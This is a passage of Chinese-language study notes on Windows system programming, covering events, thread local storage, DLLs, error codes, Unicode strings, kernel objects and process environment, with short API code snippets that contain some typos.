NULL。 fInitial 表示事件初始的触发状态，TRUE 为已触发。 fManual 表示是否手动设置。 触发或解除出发使用以下函数 12SetEvent(hEvent);ResetEvent(hEvent); 等待事件触发 1WaitForSingleObject(hEvent, dwTimeOut); 如果事件处于触发状态，该函数会立刻返回；否则会等待事件触发，最长等待 dwTimeOut 毫秒。dwTimeOut 可设置为 INFINITE。 如果 CreateEvent 的 fManual 参数为 FALSE，那么 WaitForSingleObject 返回后，事件对象的触发状态会自动设置为未触发。 线程本地存储线程本地存储（Thread Local Storage）是线程私有并一直存在的存储单元。 使用线程本地存储，首先需要创建一个包含所有静态私有数据的的结构 1234typedef struct{ int a,b;} DATA, *DATA; 然后使用 TlsAlloc获取一个索引 1dwTlsIndex = TlsAlloc(); 这个索引可以保存在全局变量中，或者通过参数结构传递给线程函数。 线程函数一开始为这个数据结构分配内存并调用 TlsSetValue 1TlsSetValue(dwTlsIndex, GlobalAlloc(GPTR, sizeof(DATA))); 这个函数将指向线程本地数据结构的指针和特定的线程以及特定的线程索引关联。现在可以使用以下方法访问这个指针 1234PDATA pdata;...pdata = (PDATA) TleGetValue(dwTlsIndex);pdata-&gt;a; 线程函数终止运行之前释放已分配的内存 1GlabalFree(TlsGetValue(dwTlsIndex)); 所有使用这个本地存储的线程结束后，在主线程释放索引 1TlsFree(dwTlsIndex); 可以使用前置符__declspec(thread) 12__declspec(thread) int iGlobal = 1; //定义全局静态变量__declspec(thread) static int iLocal = 1; //定义函数内部的静态变量 动态链接库关于库的基本知识动态链接库一般不能直接执行，而且他们一般也不接收消息。他们是包含许多函数的独立文件，这些函数可以被应用程序和其他DLL调用以完成默写特定的工作。一个动态链接库只在另一个模块调用其所包含的函数时才会被启动。 动态链接指 Windows 的链接过程。这个过程中它把模块中的函数调用与在库模块中的实际函数链接在一起。静态链接一般是在程序开发过程中发生的，用于把一些文件链接在一起创建一个 Windows 可执行文件。这些文件包括各种各样的对象模块（.OBJ），运行时库文件（.LIB），通常还有已编译的资源文件（.RES）。与其相反，动态链接发生在程序运行时。 一些动态链接库（如字体文件）被称为 resource-only 的，它们只包含数据，没有代码。 动态链接库的扩展名是任意的，但只有扩展名为 .DLL 的动态链接库才能被 Windows 自动加载。如果该文件有其他的扩展名，则程序必须调用LoadLibrary或LoadLibraryEx函数加载相应模块。 库除了动态链接库，还有对象库（object library）和导入库（import library）。 对象库是扩展名为 .LIB 的文件，这个文件中的代码在运行链接器进行静态链接时被添加到程序的 .EXE 文件中。 导入库是一种特殊的对象库，扩展名也是 .LIB。链接器用它来解析源代码中的函数调用。然而导入库不含代码，它给链接器提供信息，以建立 .EXE 文件中用于动态链接的重定位表格。 一个简单的DLLDLL 中供应用程序所用的函数必须先导出，EXPORT 关键字确保函数名称被添加到 .DLL 文件中，使得链接器在链接使用这些函数的应用程序时可以正确解析该函数名，并且确保这些函数在 DLL文件中可见。 如果头文件由 C++ 模式编译，则 EXPORT 标识符会包含存储类关键字__declspec(dllexport)和exter &quot;C&quot;，这可以防止编译器对 C++ 函数进行名称重整，使 C 和 C++ 程序都能使用该 DLL。 库的入口点和退出点1int WINAPI DllMain (HINSTANCE hInstance, DWORD fdwReason, PVOID pvReserved); 当库第一次开始和终止时， DllMain 都会被调用。DllMain 的第一个参数时库的实例句柄。如果库使用的资源需要实例句柄，则应该把 hInstance 作为一个全局变量保存。 fdwReason 参数可以是四个值中的一个，用来说明 Windows 调用 DllMain 函数的原因。一个程序可以被多次加载，并在 Windows 环境下同时运行，每一次程序加载都可以认为是一个独立的进程。 当 fdwReason 值为 DLL_PROCESS_ATTACH时，表明动态链接库已经被映射到一个进程的地址空间，这相当于一个初始化信号，让库针对所服务进程的后续请求进行初始化工作。在一个进程的整个生命周期内，DllMain 只有一次会在调用中带有DLL_PROCESS_ATTACH参数。 如果初始化成功，DllMain 应该返回非零值，否则将导致 Windows 无法运行该程序。 fdwReason 值为 DLL_PROCESS_DETACH时，表示这个进程不再需要该 DLL 了，这给了库一个自我清理的机会。 fdwReason 值为DLL_THREAD_ATTACH时，表示一个关联的进程创建了一个新的线程，该线程终止时，Windows 会以 fdwReason 参数为 DLL_THREAD_DETACH 调用 DllMain。即使之前没有DLL_THREAD_ATTACH的情况下，也可能出现DLL_THREAD_DETACH的调用，例如动态链接库连接到一个进程时，该线程已经创建。以DLL_THREAD_DETACH调用时，线程仍然存在，它甚至还可以在此过程中发送线程消息，但它不应该再使用PostMessage。 在 DLL 中共享内存Windows 让同时使用相同动态链接库的进程相互隔离。 Windows 核心编程错误处理Windows 函数的错误调用 Windows 函数时，会先验证参数，然后开始执行。如果传入的参数无效，或者由于其他原因导致操作无法执行，则由返回值指出函数因为某些原因失败了。 数据类型 调用成功返回值 调用失败返回值 备注 VOID 该函数不可能失败 BOOL 非0值 0 应检查其是否不为 FALSE HANDLE 标识一个可操纵对象 NULL 或 INVALID_HANDLE_VALUE（通常为-1） PVOID 标识一个数据块的内存地址 NULL LONG/DWORD LONG 或 DWORD 0 或 -1 必要时查看 Platform SDK 文档。 错误代码在内部，Windows 函数检测到错误时，使用线程本地存储区机制（thread-local storage）将错误代码与主调i线程（calling thread）关联，在返回时用返回值指出发生了错误。使用GetLastError函数查看错误，该函数返回上一个函数调用设置的线程的 32 位错误代码。 Windows 函数失败后应立刻调用 GetLastError，因为下一个函数很可能改写此值，即使成功调用的函数也可能用 ERROR_SUCCESS 改写此值。成功调用也可能有不同的情况，需要获取额外信息时也应调用GetLastError。 WinError.h头文件包含了 MS 定义的错误代码列表，每个错误由消息ID（宏），消息文本（注释）和编号（LONG值）组成 1234#define ERROR_INVALID_FUNCTION 1L// MessageId: ERROR_INVALID_FUNCTION// MessageText://Incorrect function. 使用FormatMessage函数可以将错误代码转换为相应的文本描述，该函数也有翻译功能。 自定义错误编写函数时，通过设置错误代码（调用SetLastError）并返回指出发生了错误的值（FALSE，INVALID_HANDLE_VALUE，NULL 或其他值）来指出发生了错误 1VOID SetLastEror(DWORD dwErrCode) 尽量使用WinError.h中的代码，在需要时创建自己的错误代码，它是一个32位数，由以下几个字段组成 位 31-30 29 28 27-16 15-0 内容 严重性 MS/客户 保留 Facility代码 异常代码 含义 0（成功），1（信息/提示），2（警告），3（错误） 0（MS定义的代码），1（客户定义的代码） 必须为0 前256个值由MS保留 MS/客户定义的代码 字符与字符串处理字符编码分为 ANSI 和 Unicode，Vista 的 Unicode 字符使用 UTF-16 编码 .NET Framework始终使用 UTF-16 编码所有字符和字符串。 C语言中，数据类型wchar_t表示一个 UTF-16 字符，字符和字符串前加L提示编译器将该字符串用 UTF-16 编码，使用方法如下 12wchar_t c = L'a';wchar_t buf[100] = L&quot;A String&quot;; 数据类型WinNT.h提供了一些 typedef 12345678910typedef char CHAR;typedef wchar_t WCHAR；typedef CHAR *PCHAR;typedef CHAR *PSTR;typedef CONST CHAR *PCSTR;typedef WCHAR *PWCHAR;typedef WCHAR *PWSTR;typedef CONST WCHAR *PCWSTR; 使用宏可以使得 Unicode 和 ANSI 子丰富都能通过编译，WinNT.h中还有如下类型和宏 123456789101112131415#ifdef UNICODEtypedef WCHAR TCHAR, *PTCHAR, PTSTR;typedef CONST WCHAR *PCTSTR;#define __TEXT(quote) quote#define __TEXT(quote) L##quote#elsetypedef CHAR TCHAR,*PTCHAR, PTSTR;typedef CONST CHAR *PCTSTR;#define __TEXT(quote) quote#endif#define TEXT(quote) __TEXT(quote) 使用时 12TCHAR c = TEXT('A');TCHAR buf[100] = TEXT(&quot;A String&quot;); Windows 中的 Unicode 函数和 ANSI 函数如果一个 Windows 函数的多数列表中有字符串，则该函数通常有两个版本。例如CreateWindowEx有CreateWindowExW和CreateWindowExA两个版本，W 表示宽字节，A 表示 ANSI 字符。 使用时只需使用CreateWindowEx，在 WinUser.h中有如下宏 12345#ifdef UNICODE#define CreateWindowEx CreateWindowExW#else#define CreateWindowEx CreateWindowExA#endif ANSI 版本一般只是分配内存，执行转换操作，然后调用 Unicode 函数。 程序中应尽量使用 Unicode 字符。 C 运行库中的 Unicode 函数 和 ANSI 函数一般不会互相调用。 对应于strlen的Unicode版本为wcslen，两个原型都在 string.h，TChar.h包含以下宏，可以使用 Unicode 或 ANSI 编译 12345#ifdef _UNICODE#define _tcslen wcslen#else#define _tcslen strlen#endif C运行库中的安全字符串函数新版本的函数相对于旧版本在后面添加一个_s，并接受一个新的参数 12PTSTR _tcscpy (PTSTR strDestination, PCTSTR strSource);errno_t _tcscpy_s(PTSTR strDestination, size_t numberOfCharacters, PCTSTR strSource); 将一个可写的缓冲区作为参数传递时，必须同时提供他的大小，值是一个字符数。对缓冲区使用_countof宏（在stdlib.h中定义）计算这个值。 安全函数会检查指针不为NULL，整数在有效范围内，枚举值有效，缓冲区足够容纳结果数据。如果其中有任何一个失败，函数都会设置 error值并返回一个 errno_t 值指出成功或者失败（并不实际返回），debug 版本显示 Debug Assertion Failed 对话框，release 版本直接终止运行。 也可以自己定义一个函数，检测到参数无效时调用该函数。在这个函数中可以记录失败，附上调试器或者做其他工作。原型如下 1void InvalidParamenterHandler(PCTSTR expression, PCTSTR function, PCTSTR file, unsigned int line, uintptr_t/*pReserved*/); expression 描述了代码中可能出现的函数失败，比如(L&quot;Buffer is too small&quot;&amp;&amp;0)，function、file、line 分别描述了出现错误的函数名称、源代码文件和行号。 然后调用_set_invalid_parameter_handler注册这个处理程序，还要调用_CrtSetReportMode(_CRT_ASSERT,0);来禁止出现 Debug Assertion Failed 对话框。 定义了用于处理错误的函数后，使用安全函数时就可以检查返回的 errorno_t ，只有返回S_OK才表明函数调用成功，其他返回值在error.h中定义。 控制字符串C 运行库也有在执行字符串处理时提供控制的函数，如控制天重复或指定如何截断，也有 W 和 A 版本。 Cch 表示 Count of characters，使用 _countof宏获取， Cb 表示 count of bytes，使用 sizeof 获取。 这些函数返回一个 HRESULT HRESULT值 描述 S_OK 成功 STRSAFE_E_INVALID_PARAMETER 失败，将 NULL 传给了一个参数 STRSAFE_E_INSUFFICIENT_BUFFER 失败，缓冲区太小 Windows 字符串处理函数推荐的字符和字符串处理方式编写程序时： 将文本字符串视为字符的数组，而不是 char 或字节的数组 使用通用数据类型（如TCHAR/PTSTR)）表示文本字符和字符串 用明确的数据类型（如 BYTE/PBYTE）表示字节、字节指针和数据缓冲区 用 TEXT 或 _T宏（两者之一）表示字面量字符和字符串 执行全局替换（如用 PTSTR 替换 PSTR） 修改与字符串有关的计算。例如函数幼传入缓冲区大小的字符数而不是字节数时，应传入_countof(szBuffer)而不是sizeof(szBuffer。分配内存时按字节分配，所以应调用malloc(nCharacters* sizeof(TCHAR))而不是malloc(nCharacters)。 避免使用 printf 系列函数，尤其不要使用%s和%S占位符进行 ANSI 和 Unicode 字符串的转换。正确做法是使用 MultiByteTowideChar 和 WideCharToMultiByte函数 UNICODE和_UNICODE符号要么同时指定，要么都不指定 对于字符串处理函数 始终使用安全的字符串处理函数 不要是哟个不安全的C运行库字符串处理函数 使用 /GS 和 /RTCs 编译器标志来自动检测缓冲区溢出 不要使用 Kernel32 方法进行字符串处理，如 lstrcat 和 lstrcpy 比较字符串时，应使用 CompareStringOrdinal，因为它非常快而且不考虑用户的区域设置。用户字符串一般要在用户界面上显式，对于这些字符串应使用CompareString(Ex)，因为它考虑用户的区域设置 Unicode 与 ANSI 字符串转换导出 ANSI 和 Unicode DLL 函数判断文本是 ANSI 和 Unicode内核对象内核对象概念内核对象由函数创建，每个内核对象都是一个内存块，由操作系统内核分配，只能由操作系统内核访问。程序通过调用 Windows 提供的函数操作内核对象。 调用一个创建内核对象的函数后，函数返回一个句柄（handle），标识了所创建的对象，它是进程相关的，可以被进程中的任何线程使用 除了内核对象，还有用户对象和GDI（Grapical Device Interface）对象。几乎所有创建内核对象的函数都有有一个允许我们指定安全属性信息的参数。 使用计数（usage count）操作系统内核知道当前有多少个进程正在使用一个特定的内核对象，因为内核对象都包含一个数据成员——使用计数。创建时，使用计数为 1，另一个进程获得对现有对象的访问权后，使用计数递增，进程终止时使用计数递减，使用计数为0时销毁该内核对象。 内核对象安全性内核对象可以用一个安全描述符（security descriptor，SD）保护。它描述了谁拥有对象，哪些用户允许访问或使用对象，那些组和用户拒绝访问此对象。 用于创建内核对象的所有函数几乎都有一个指向 SECURITY_ATTRIBUTES结构的指针作为参数，这个结构只有一个与安全性有关的成员IpSecurityDescriptor。 访问现有对象时，必须指定将对此对象进行何种操作，函数会进行安全检查。 进程内核对象句柄表一个进程初始化时，系统将为其分配一个句柄表（handle table），这个句柄表仅供内核对象使用。 一个句柄表就是一个结构组成的数组，每个结构保护一个指向内核对象的指针，一个访问掩码（包含标志位的一个DWORD）和一些标志。 创建内核对象进程初始化时，其句柄表为空。当进程内的一个线程调用一个会创建内核对象的函数时，内核将为这个对象分配并初始化一个内存块，然后内核扫描进程的句柄表，查找一个空白的记录项（empty entry），并对其进行初始化。 用于创建内核对象的任何函数都会返回一个与进程相关的句柄，这个句柄可以由同一个进程中运行的所有线程使用。系统用索引表示内核对象的信息保存在进程句柄表中的具体位置。要得到实际的索引值，聚丙酯应该右移两位来忽略 Windows 操作系统内部使用的最后两位。 调用一个函数时，如果它接受一个内核对象句柄作为参数，必须把 Create* 函数返回的值传给它。在内部，这个函数会查找进程的句柄表，获得目标内核对象的地址，然后用某种方式操作对象的数据结构。 如果传入一个无效的句柄，函数会失败，GetLastError 会返回6（ERROR_INVALID_HANDLE），由于句柄值实际上时作为进程句柄表的索引使用的，所以句柄与当前进程相关，无法供其他进程使用。否则实际引用的只是那个进程句柄表中位于同一个索引位置的内核对象。 使用函数创建内核对象失败时，返回的句柄值通常为0（NULL），所以第一个有效句柄值为4。另外有几个函数失败时会返回 -1（INVALID_HANDLE_VALUE）。 关闭内核对象无论用什么方法创建内核对象，都要调用CloseHandle向系统表明我们已经结束使用对象 1BOOL CloseHandle(HANDLE hobject); 内部，该函数首先检查主调进程的句柄表，验证”传给函数的句柄值“标识的是”进程确实有权访问“的一个对象。如果句柄有效，系统将获得内核对象数据结构的地址，并将结构中的”使用计数“成员递减。如果句柄无效，分两种情况：如果程序是正常运行的，CloseHandle 将返回 FALSE，而 GetLastError 返回 ERROR_INVALID_HANDLE；如果进程正在被调试，系统将抛出异常（指定了无效的句柄）来方便调试。 CloseHandle 返回之前会清楚进程句柄表中对应的记录想，所以不能再试图使用它。 跨进程边界共享内核对象使用对象句柄继承只有在进程之间有父子关系时，才能使用对象句柄继承。 父进程需要进行如下步骤： 首先父进程创建内核对象时，父进程必须向系统指出它希望这个对象的句柄是可继承的。初始化一个SECURITY_ATTRIBUTES，指定句柄可继承，并传给具体的 Create 函数 123456SECURITY_ATTRIBUTES sa;sa.nLength = sizeof(sa);sa.nSecurityDescriptor = NULL;sa.binheritHandle = TRUE; // Make the returned handle inheritableHANDLE hMutex = CreateMutex(&amp;sa, FALSE, NULL); 进程句柄表中的记录项有一个标志位（最低位），默认为0，为1时表示这个句柄时科技城的。 然后由父进程生成子进程，通过调用CreateProcess函数完成， 123456789101112BOOL CreateProcess{ PCTCTR pszApplicationName; PTSTR pszCommandLine, PSECURITY_ATTRIBUTES psaProcess, PSECURITY_ATTRIBUTES psaThread, BOOL bInheritHandles, DWORD dwCreationFlags, PVOID pvEnvironment, PCTSTR pszCurrentDirectory, LPSTARTUPINFO pStartupInfo, PPROCESS_INFORMATION pProcessInformation;} 如果bInheritHandles为TRUE，子进程就会继承父进程的“可继承的句柄”的值，系统创建子进程时，为子进程创建一个新的进程句柄表，并遍历父进程的句柄表，包含“可继承的句柄”的项都会被完整复制到子进程的句柄表。在子进程的句柄表中，复制项的位置与之前一致，所以子进程和父进程中对一个内核对象进行标识的句柄值也是一致的。内核对象的使用计数也会递增。 子进程不知道自己继承了句柄，为了使子进程得到继承的内核对象的句柄值，常见方式是将句柄值作为命令行参数传给子进程。也可以使用其他进程间通信技术，或者让父进程添加子进程知道的环境变量。 改变句柄的标志使用SetHandleInformation函数可以修改函数标志 12345BOOL SetHandleInformation{ HANDLE hObject, DWORD dwMask, DWORD dwFlags;} hObject 标识了一个有效句柄，dwMask告诉我们向修改哪个或那些标志，目前每个句柄关联两个标志 12#define HANDLE_FLAG_INHERIT 0x00000001 #define HANDLE_FLAG_PROTECT_FROM_CLOSE 0x00000002 HANDLE_FLAG_PROTECT_FROM_CLOSE表示禁止系统关闭句柄 第三个参数指出希望把标志修改为什么。 12345//打开继承标志SetHandleInformation(hObj, HANDLE_FLAG_INHERIT&lt;HANDLE_FLAG_INHERIT);//关闭继承标志SetHandleInformation(hObj, HANDLE_FLAG_INHERIT, 0); 为对象命名为对象命名也可以实现跨进程边界共享内核对象，多数内核对象都可以进行命名，创建内核对象的函数会有一个pszName参数，传入NULL时表示创建匿名对象，也可以传入字符串为对象命名。 MS 不存在保证对象名唯一的机制，所有对象共享同一个命名空间。 共享对象时，首先进程 A 创建一个命名的对象 1HANDLE hMutexProcessA = CreateMutex(NULL, FALSE, TEXT('AMutex')); 进程 B 执行 1HANDLE hMutexProcessB = CreateMutex(NULL, FALSE TEXT('AMutex')); 系统首先查看是否存在一个名为AMutex的内核对象，如果存在，接下来检查该对象的类型。进程 B 试图创建一个互斥量对象，AMutex 也是互斥量对象，检查通过。然后系统进行安全检查，验证调用者是否拥有对该对象的完全访问权限，如果是，系统会在 B 的句柄表中查找一个空白记录项，将其初始化为现存的内核对象。如果中间有一处检查失败，函数返回NULL。 创建内核对象的函数总是返回具有完全访问权限的句柄，如果需要限制句柄的访问权限，可以使用这些函数的扩展版本（EX）。 除了调用Create*函数，也可以使用Open*函数实现共享。Open函数在对象不存在时不会创建新的对象，只会调用失败。 通常使用 GUID 防止出现命名冲突。 终端服务命名空间终端服务（Terminal Service）的情况不通，正在运行终端服务的计算机中，有多个用于内核对象的命名空间，其中一个是全局空间 可以使用ProcessIdToSessinId函数查看当前进程在哪个 Terminal Service 会话中运行（由kernel32.dll导出，在WinBase.h中声明） 12345678DWORD processID = GetCurrentProcessId();DWORD sessionID;if(ProcessIdToSessionId(processID, &amp;sessionID)) { tprintf(TEXT('Process '%u' runs in Terminal Services session '%u', processID, sessionID'));} else { ...}} 一个服务的命名内核对象始终位于全局命名空间内，默认情况下，终端服务中的应用程序把自己的内核对象放在会话的命名空间内。使用Global\\前缀可以强制把一个命名对象放入全局命名空间 1HANDLE h = CreateEvent(NULL, FALSE FALSE, TEXT('Global\\\\MyName')); 也可以使用Local\\前缀显式指出希望将内核对象放入当前会话的命名空间。 专有命名空间创建内核对象时，可以传入一个指向SECURITY_ATTRIBUTES结构的指针，来保护对象。Vista 之前，任何进程都能用任何指定的名称创建一个对象。可以创建专有的命名空间（类似 Global 和 Local）来保护对象。 创建边界（bondary），将对应于本地管理员（Local Administrators）的安全描述符（Security Identifier，SID）与它关联起来，然后创建或打开其名称被用作内核对象前缀的命名空间。 复制对象句柄使用DuplicateHandle函数可以获得一个进程句柄表的一个记录项，然后再另一个进程的句柄表中创建这个记录项的一个副本。 12345678BOOL DuplicateHandle ( HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, PHANDLE phTargetHandle, DWORD dwDesiredAdress, BOOL bInheritHandle, DWORD dwOptions); 进程进程由两部分组成：内核对象和地址空间，这个地址空间包含所有可执行文件或 DLL 模块的代码和数据，还有堆和栈的分配。 第一个 Windows 程序入口点函数有两种 12345678910int WINAPI _tWinMain ( HINSTANCE hInstanceExe, HINSTANCE, PTSTR pszCmdLine, int nCmdShow);int _tmain ( int argc, TCHAR *argv[], TCHAR *envp[]); 链接可执行文件时，链接器选择正确的 C/C++ 运行库启动函数。启动函数会： 获取指向新进程的完整命令行的一个指针 获取指向新进程的环境变量的一个指针 初始化 C/C++ 运行库的全局变量 初始化 C 运行库内存分配函数和其他底层 IO 使用的堆 调用所有全局变量和静态 C++ 类对象的构造函数 程序可以访问的 C/C++ 运行库全局变量如下 名称 类型 描述和推荐使用的 Windows 函数 _osver _winmajor _winminor __argc __argv _environ _pgmptr 之后会调用程序的入口点函数，入口点函数返回后，启动函数调用 C 运行库函数 exit，向其传递返回值nMainTreVal，exit 函数执行以下任务 调用_onexit函数调用所注册的任何一个函数 调用所有全局和静态 C++ 类对象的析构函数 在 DEBUG 生成中，如果设置了_CRTDBG_LEAK_CHECK_DF标志，则通过调用_CrtDumpMemoryLeaks生成内存泄漏报告 调用操作系统的 ExitProcess 函数，想起传入 nMainRetVal。这会导致操作系统 kill 我们的进程，并设置其退出代码 进程实例句柄加载到进程地址空间的每一个可执行文件或者 DLL 文件都有一个独一无二的实例句柄，可执行文件的实例被当作 WinMain 函数的第一个参数 hInstanceExe 传入，需要加载资源的函数调用中一般都要提供此句柄的值。比如从可执行文件中加载图标 123HICON LoadIcon { HINSTANCE hInstance, PCTSTR pszIcon}; Platform SDK 文档中，有些函数需要一个 HMODULE 类型的参数。HMODULE 和 HINSTANCE 完全相同。 GetModuleHandle函数可以获取一个可执行文件或者 DLL 文件被加载到进程地址空间的什么位置 1HMODULE GetModuleHandle(PCTSTR pszModule); pszModule 参数指定已在主调进程的地址空间中加载的一个可执行文件或 DLL 文件的名称。如果找到了指定的文件，会返回基地址，否则返回 NULL。如果传入 NULL，则返回主调进程的可执行文件的基地址。 如果代码在 DLL 中运行，为了知道代码在什么模块中运行，可以使用链接器提供的伪变量__ImageBase或者调用GetModuleHandleEx，第一个参数传入GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS，第二个参数传入当前函数的地址，该函数会用传入函数所在 DLL 的基地址填入第三个参数中。 GetModuleHandle函数只检查主调进程的地址空间，如果传入 NULL，会返回进程的地址空间中的可执行文件的基地址，即使调用该函数的代码是在一个 DLL 文件中。 进程前一个实例的句柄（hPrevInstance）C/C++ 运行库启动代码总是向 WinMain 的 hPrevInstance 参数传递 NULL，该参数用于16位 Windows 系统，平时不要引用这个参数。建议将 WinMain 按如下写法编写 123456int WINAPI _tWinMain( HINSTANCE hInstanceExe, HINSTANCE, PSTR pszCmdLine, int nCmdShow); 也可以使用UNREFERENCED_PARAMETER宏指出该参数未使用 1234567int APIENTRY _tWinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow){UNREFERENCED_PARAMETER(hPrevInstance);} 进程的命令行系统在创建一个新进程时，会传一个命令行给它。C于悉尼国库的启动代码开始执行一个 GUI 程序时，会调用 Windows 函数 GetCommandLine 来获取进程的完整命令行，忽略可执行文件的名称，然后将指向命令行剩余部分呢的一个指针传给 WinMain 的 pszCmdLine 参数。 虽然 pszCmdLine 指向的缓冲区可写，但应注意越界问题，最好将它当作只读的。 也可以像 C 运行库一样获取完整命令行 1PTSTR GetCommandLine(); 利用 CommandLineToArgvW 可以将 Unicode 字符串分解为单独的标记 123PWSTR* CommandLineToArgvW( PWSTR pszCmdLine, int* pNumArgs); 第一个参数指向一个命令行字符串，通常是GetCommandLineW函数调用的返回值，pNumArgs 参数是一个整数的地址，该整数会被设置位命令行中的实参数目。CommandLineArgW 返回一个 Uniclde 字符串指针数组的地址。 CommandLineToArgvW 在内部分配内存，如果需要手动释放内存，可以调用 HeapFree 12345678int nNumArgs;PWSTR *ppArgv = CommandLineArgvW(GetCommandLineW(), &amp;nNumArgs);if (*ppArgv[1] == L'x'){ ...}HeapFree(GetProcessHeap(), 0, ppArgv); 进程的环境变量每个进程都有一个与它相关的环境块（environment block），这是在进程地址空间分配的一块内存，包含的字符串与下面类似 12345=::=::\\ ...VarName1=VarValue1\\0VarName2=VarValue2\\0 ...VarNameX=VarValueX\\0\\0 除了第一个=::=::\\字符串，还可能存在其他以=开头的字符串，它们不作为环境变量使用。 访问环境块的第一种方式是使用GetEnvironmentStrings函数获取完整的环境块，得到的字符串与上面一致。不再使用这块内存时，应使用FreeEnvironmentStrings释放。 12PTSTR pEnvBlock = GetEnvironmentStrings();FreeEnvironmentStrings(pEnvBlock); 第二种方式是 CUI 程序专用的，它通过应用程序 main 入口点函数接受的 TCHAR* env[]参数实现。env 是一个字符串指针数组，每个指针指向一个不同的环境变量（名称=值 的格式）。指向最后一个环境变量字符串的指针后面，会有一个 NULL 指针表明这是数组的末尾。以=开头的字符串在接收到 env 之前就会被移除。 环境变量中的空格是有意义的。ABC=XYZ不同于ABC = XYZ。 用户登录时，系统会创建 shell 进程，并将一组环境字符串与其关联，系统通过检查注册表中的两个注册表项来获得出事的环境字符串。 第一个注册表项包含应用于系统的所有环境变量的列表，HKEY_LOCAL_MACHINE\\SYSTEM\\Current\\Set\\Control\\Session Manager\\Environment，第二个注册表项包含应用于当前登录用户的所有环境变量的列表，HKEY_CURRENT_USER\\Environment。 用户可以通过控制面板或者调用注册表函数修改注册表项。修改后，有些程序的主窗口可以接受 WM_SETTINGCHANGE 消息，更新环境块，如希望其立刻更新，可以使用如下方法 1SendMessage(HWND_BROAUCAST, WM_SETTINGCHANGE, 0, (LPARAM)TEXT(&quot;Environment&quot;)); 通常，子进程会继承一组环境变量，与父进程相同。但是父进程可以控制哪些环境变量允许子进程继承。父进程和子进程不共享同一个环境块。 使用GetEnvironmentVariable可以检查环境变量是否存在，如果存在，它的值是什么 1234DWORD GetEnvironmentVariable( PCTSTR pszName, PTSTR pszValue, DWORD cchValue); 字符串中有时包含可替换部分，如%USERPROFILE%\\Documents，可以使用ExpandEnvironmentStrings替换 1234DWORD ExpandEnvironmentStrings( PTCSTR pszSrc, PTSTR pszDst, DWORD chSize); 可以使用SetEnvironmentVaribal添加删除或修改变量的值 123BOOL SetEnvironmentVariable( PCTSTR pszName, PCTSTR pszValue); 进程的关联性通常，进程中的线程可以在主机的任何 CPU 上执行，但是也可以强迫进程在可用 CPU 的一个子集上运行，这称为“处理器关联性”（processor affinity）。 进程的错误模式每个进程都关联了一组标志，这些标志的作用是让系统直到进程如何响应严重错误，包括磁盘介质错误，未处理的异常，文件查找错误以及数据对其错误等。进程可以调用SetErrorMode告诉系统如何处理这些错误 1UINT SetErrorMode(UINT fuErrorMode); fuErrorMode 参数时下表中按位或的结果 标志 描述 SEM_FAILCRITICALERROR 系统不显示严重错误处理程序（critical-error-handler）消息框，并将错误返回主调进程 SEM_NOGPFAULTERRORBOX 系统不显示常规保护错误（general-protection-fault）消息框，此标志只应该由调试程序设置；该调试程序用一个异常处理程序来自行处理常规保护（general protection，GP）错误 SEM_NOOPENFILEERRORBOX 系统查找文件关联，不显示消息框 SEM_NOALIGNMENTEAULTEXCEPT 系统自动修复内存对齐错误，并使应用程序看不到这些错误，对 x86/x64 处理器无效 默认情况下，子进程会继承父进程的错误模式标志。 进程当前所在的驱动器和目录如果不提供完整的路径名，各种 Windows 函数会在当前驱动器的当前目录查找文件和目录。系统在内部追踪记录着一个进程的当前驱动器或目录，这种信息以进程为单位维护，如果进程中的一个线程改变了当前目录，这个进程中的其他线程也会受到影响。 可以调用以下两个函数获取和设置所在进程的当前驱动器和目录 1234DWORD GetCurrentDirectory( DWORD cctCCurDir, PTSTR pszCurDir);BOOL SetCurrentDirectory(PCTSTR pszCurDir); 进程的当前目录系统跟踪记录进程的当前驱动器和目录，但它没有记录每个驱动器的当前目录。可以在环境变量中添加如下的字符串来指出各个驱动器的当前目录 12=C:=C:\\Utility\\bin=D:=D:\\Program Files 如果调用一个函数，传入的路径名限定的是当前驱动器以外的驱动器，系统会在进程的环境块中查找与指定的驱动器号关联的变量。如果找到，则将该变量的值作为当前目录使用，如果没有找到，则假定指定驱动器的当前目录为它的根目录。 如果父进程创建了一个希望传给子进程的环境块，紫荆城的环境块就不会自动继承父进程的当前目录。可以在子进程生成前，将这些驱动器号环境变量添加到环境块中。 12345678DWORD GetFullPathName( PCTSTR pszFile, DWORD cchPath, PTSTR pszPath, PTSTR *ppszFilePart); TCHAR szCurDir[MAX_PATH];DOWRD cchLength = GetFullPathName(TEXT(&quot;C:&quot;), MAX_PATH, szCurDir, NULL); 驱动器号环境变量通常必须放在环境块的开始处。 系统版本GetVersion函数的低位字为主版本号，高位字为次版本号。 1234567891011121314151617181920GetVersionEx(POSVERSIONINFOEX pVersionInformaton);typedef struct { DWORD dwOSVersionInfoSize, DWORD dwMajorVersion, DWORD dwMinorVersion, DWORD dwBuildNumber, DWORD dwPlatformId, TCHAR szCSDversion[128], WORD wServicePackMajor, WORD wServicePackMinor, WORD wSuiteMask, BYTE wProductType, BYTE wReserved,} OSVERSIONINFOEX, *POSVERSIONINFOEX;BOOL VerifyVersionInfo( POSVERSIONINFOEX pVersionInfomation, DWORD dwTypeMask, DWORDLONG dwlConditionMask); dwTypeMask 参数指出我们初始化了此结构的那些成员，dwlConditionMask描述比较方式，可以使用宏来设置 1234VER_SET_CONDITION( DOWRDLONG dwlConditionMask, ULONG dwTypeBitMask, ULONG dwConditionMask) 建立一组条件之后就可以调用 VerifyVersionInfo，成功返回非零值，如果返回0，说明主机系统不符合要求或者调用函数方式不正确，可以使用 GetLastError 查看错误原因。 DLL 基础将 DLL 文件映像映射到调用进程的地址空间有两种方式：隐式载入时链接(implicit lod-time linking)或显式运行时链接(explicit run-time linking)，本章讨论隐式链接。 DLL 和进程的地址空间DLL 不会拥有任何对象，DLL 中函数创建的对象都为调用线程活调用进程拥有。 一个模块提供一个内存分配函数的时候，必须同时提供另一个用来释放内存的函数。 12345678910111213VOID EXEFunc() { PVOID pv = DLLFunc(); DLLFreeFunc(pv);}PVOID DLLFunc() { PVOID pv = malloc(100); return(pv);}BOOL DLLFreeFunc(PVOID, pv) { return free(pv);} 纵观全局如果一个可执行模块需要从另一个 DLL 模块中导入函数活变量，必须先构建 DLL 模块，然后构建可执行模块。 构建 DLL 模块： 创建一个头文件，包含想要在 DLL 模块中导出的函数原型、结构以及符号。所有 DLL 的源文件都要包含这个头文件 创建 C/C++ 源文件来实现想要在 DLL 模块中导出的函数和变量 